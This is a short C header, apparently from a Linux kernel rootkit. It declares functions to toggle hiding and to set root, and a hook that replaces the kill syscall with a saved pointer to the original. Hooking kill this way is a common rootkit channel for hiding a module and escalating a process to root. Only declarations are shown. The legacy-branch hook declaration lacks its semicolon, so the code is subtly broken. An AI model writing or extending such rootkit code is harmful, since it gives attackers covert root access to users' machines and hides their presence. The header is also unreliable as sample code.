#include "../common.h"

void toggleHiding(void);
void setRoot(void);

#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long (*killOG)(const struct pt_regs *);
asmlinkage int killHook(const struct pt_regs *regs);
#else
asmlinkage long (*killOG)(pid_t pid, int sig);
asmlinkage int killHook(pid_t pid, int sig)
#endif
